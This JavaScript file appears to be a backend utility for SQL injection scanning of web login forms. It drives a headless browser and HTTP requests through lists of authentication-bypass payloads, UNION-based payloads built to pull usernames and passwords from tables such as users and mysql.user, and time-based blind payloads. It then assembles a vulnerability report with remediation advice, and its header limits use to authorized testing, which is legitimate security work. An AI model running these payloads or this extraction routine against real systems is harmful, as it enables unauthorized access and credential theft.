// backend/src/utils/sqlInjectionTest.js
import axios from "axios";
import puppeteer from "puppeteer";

/**
 * SQL Injection testing utility for authorized penetration testing
 * WARNING: Only use on systems you have explicit permission to test
 */

// Common SQL injection payloads
const SQL_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",
  "' OR 1=1--",
  "') OR ('1'='1",
  "' UNION SELECT NULL--",
];

// Error-based SQL injection patterns
const SQL_ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /Warning.*pg_/i,
  /valid PostgreSQL result/i,
  /Npgsql\./i,
  /Driver.*SQL.*Server/i,
  /OLE DB.*SQL Server/i,
  /SQLServer JDBC Driver/i,
  /SqlException/i,
  /Oracle error/i,
  /Oracle.*Driver/i,
  /Warning.*oci_/i,
  /Warning.*ora_/i,
];

/**
 * Test a login form for SQL injection vulnerabilities
 */
export async function testLoginSQLInjection(targetUrl, username = "eve@vulnmail.local") {
  const results = {
    vulnerable: false,
    findings: [],
    extractedData: null,
    testedPayloads: [],
  };

  try {
    const browser = await puppeteer.launch({
      headless: "new",
      args: ["--no-sandbox", "--disable-setuid-sandbox"],
    });

    const page = await browser.newPage();
    await page.goto(targetUrl, { waitUntil: "networkidle2", timeout: 30000 });

    // Try to find login form
    const hasLoginForm = await page.evaluate(() => {
      const inputs = Array.from(document.querySelectorAll('input[type="password"]'));
      return inputs.length > 0;
    });

    if (!hasLoginForm) {
      await browser.close();
      return results;
    }

    // Test basic SQL injection payloads
    for (const payload of SQL_PAYLOADS) {
      try {
        await page.goto(targetUrl, { waitUntil: "networkidle2" });

        // Fill in the form
        const usernameField = await page.$('input[name*="user"], input[name*="login"], input[name*="email"], input[id*="user"]');
        const passwordField = await page.$('input[type="password"]');

        if (usernameField && passwordField) {
          await usernameField.type(username);
          await passwordField.type(payload);

          // Submit the form
          const submitButton = await page.$('button[type="submit"], input[type="submit"]');
          if (submitButton) {
            await Promise.all([
              page.waitForNavigation({ waitUntil: "networkidle2", timeout: 5000 }).catch(() => {}),
              submitButton.click(),
            ]);

            // Check for SQL errors in response
            const content = await page.content();
            const hasError = SQL_ERROR_PATTERNS.some((pattern) => pattern.test(content));

            if (hasError) {
              results.vulnerable = true;
              results.findings.push({
                payload,
                type: "Error-based SQL Injection",
                evidence: "SQL error messages detected in response",
              });
            }

            // Check if login was successful (redirected or no error message)
            const currentUrl = page.url();
            const hasErrorMessage = await page.evaluate(() => {
              const text = document.body.innerText.toLowerCase();
              return text.includes("invalid") || text.includes("incorrect") || text.includes("failed");
            });

            if (currentUrl !== targetUrl && !hasErrorMessage) {
              results.vulnerable = true;
              results.findings.push({
                payload,
                type: "Authentication Bypass",
                evidence: "Successfully bypassed authentication",
              });
            }
          }
        }

        results.testedPayloads.push(payload);
      } catch (err) {
        console.log(`Payload test failed: ${payload}`, err.message);
      }
    }

    // Try UNION-based injection to extract data
    if (results.vulnerable) {
      await attemptDataExtraction(page, targetUrl, username, results);
    }

    await browser.close();
  } catch (error) {
    console.error("SQL Injection test error:", error);
  }

  return results;
}

/**
 * Attempt to extract data using UNION-based SQL injection
 */
async function attemptDataExtraction(page, targetUrl, username, results) {
  const unionPayloads = [
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password,NULL FROM users--",
    "' UNION SELECT user,password,NULL FROM mysql.user--",
    "' UNION SELECT login,pass,NULL FROM accounts--",
    `' UNION SELECT username,password,email FROM users WHERE email='${username}'--`,
  ];

  for (const payload of unionPayloads) {
    try {
      await page.goto(targetUrl, { waitUntil: "networkidle2" });

      const usernameField = await page.$('input[name*="user"], input[name*="login"], input[name*="email"]');
      const passwordField = await page.$('input[type="password"]');

      if (usernameField && passwordField) {
        await usernameField.type(payload);
        await passwordField.type("anything");

        const submitButton = await page.$('button[type="submit"], input[type="submit"]');
        if (submitButton) {
          await Promise.all([
            page.waitForNavigation({ waitUntil: "networkidle2", timeout: 5000 }).catch(() => {}),
            submitButton.click(),
          ]);

          const content = await page.content();

          // Look for data patterns in response
          const dataMatch = content.match(/([a-zA-Z0-9_]+):([a-zA-Z0-9$./]+)/);
          if (dataMatch) {
            results.extractedData = {
              payload,
              data: dataMatch[0],
              note: "Potential credentials or data extracted",
            };
            break;
          }
        }
      }
    } catch (err) {
      console.log(`Union payload failed: ${payload}`);
    }
  }
}

/**
 * Test for blind SQL injection using time-based techniques
 */
export async function testBlindSQLInjection(targetUrl) {
  const results = {
    vulnerable: false,
    technique: null,
    evidence: [],
  };

  const timeBasedPayloads = [
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  ];

  try {
    for (const payload of timeBasedPayloads) {
      const startTime = Date.now();

      try {
        await axios.post(
          targetUrl,
          { username: payload, password: "test" },
          { timeout: 10000 }
        );
      } catch (err) {
        // Timeout or error is expected
      }

      const elapsed = Date.now() - startTime;

      if (elapsed >= 5000) {
        results.vulnerable = true;
        results.technique = "Time-based Blind SQL Injection";
        results.evidence.push({
          payload,
          responseTime: `${elapsed}ms`,
        });
        break;
      }
    }
  } catch (error) {
    console.error("Blind SQL injection test error:", error);
  }

  return results;
}

/**
 * Generate a detailed SQL injection report
 */
export function generateSQLInjectionReport(testResults) {
  if (!testResults.vulnerable) {
    return null;
  }

  const report = {
    id: "sqli-01",
    title: "SQL Injection Vulnerability",
    severity: "Critical",
    owasp: "A03:2021",
    description: "The application is vulnerable to SQL Injection attacks. User input is not properly sanitized before being used in SQL queries.",
    impact: "Attackers can bypass authentication, extract sensitive data including passwords, modify or delete database records, and potentially execute system commands.",
    remediation: "Use parameterized queries (prepared statements) for all database operations. Never concatenate user input directly into SQL queries. Implement input validation and use an ORM framework.",
    exploit: {
      loophole: "User input from login forms is directly concatenated into SQL queries without proper sanitization or parameterization.",
      attackVector: "An attacker can inject SQL commands through input fields that manipulate the query logic to bypass authentication or extract data.",
      examplePayload: testResults.findings[0]?.payload || "' OR '1'='1' --",
      testedPayloads: testResults.testedPayloads,
      findings: testResults.findings,
      extractedData: testResults.extractedData,
    },
  };

  return report;
}
